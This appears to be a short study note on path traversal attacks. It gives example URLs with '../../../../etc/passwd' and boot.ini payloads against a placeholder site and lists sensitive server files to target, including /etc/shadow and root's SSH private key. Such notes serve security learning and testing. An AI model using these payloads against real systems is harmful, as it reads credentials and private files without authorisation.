---
title: Path Traversal
updated: 2022-11-25T15:01:46.0000000+04:00
created: 2022-11-25T14:53:23.0000000+04:00
---

Path Traversal
Friday, November 25, 2022
2:53 PM
allows an attacker to read operating system resources, such as local files on the server running an application.

![image1](image1-173.png)

**To Test:**

- Type the domain name followed by **/get.php?file=../../../../etc/passwd**

- <http://webpagename.com/get.php?file=../../../../etc/passwd>

**To Test of Windows Servers:**

- Type the domain name followed by **/get.php?file=../../../../boot.ini**

- <http://webpagename.com/get.php?file=../../../../boot.ini>
- <http://webpagename.com/get.php?file=../../../../windows/win.ini>

**<u>Common OS File to use when testing:</u>**

<table>
<colgroup>
<col style="width: 31%" />
<col style="width: 68%" />
</colgroup>
<thead>
<tr class="header">
<th>Location</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>/etc/issue</td>
<td>Contains a message or system identification to be printer before the login prompt</td>
</tr>
<tr class="even">
<td>/etc/profile</td>
<td>Controls system wide default variables, such as Export variables</td>
</tr>
<tr class="odd">
<td>/proc/version</td>
<td>specifies the version of the Linux kernel</td>
</tr>
<tr class="even">
<td>/etc/passwd</td>
<td>has all registered user that has access to a system</td>
</tr>
<tr class="odd">
<td>/etc/shadow</td>
<td>contains information about the system's users' passwords</td>
</tr>
<tr class="even">
<td>/root/.bash_history</td>
<td>contains the history commands for root user</td>
</tr>
<tr class="odd">
<td>/var/log/dmessage</td>
<td>contains global system messages, including the messages that are logged during system startup</td>
</tr>
<tr class="even">
<td>/var/mail/root</td>
<td>all emails for root user</td>
</tr>
<tr class="odd">
<td>/root/.ssh/id_rsa</td>
<td>Private SSH keys for a root or any known valid user on the server</td>
</tr>
<tr class="even">
<td><p>/var/log/apache2/access.log</p>
<p></p></td>
<td>the accessed requests for Apache webserver</td>
</tr>
<tr class="odd">
<td>C:\boot.ini</td>
<td>contains the boot options for computers with BIOS firmware</td>
</tr>
</tbody>
</table>

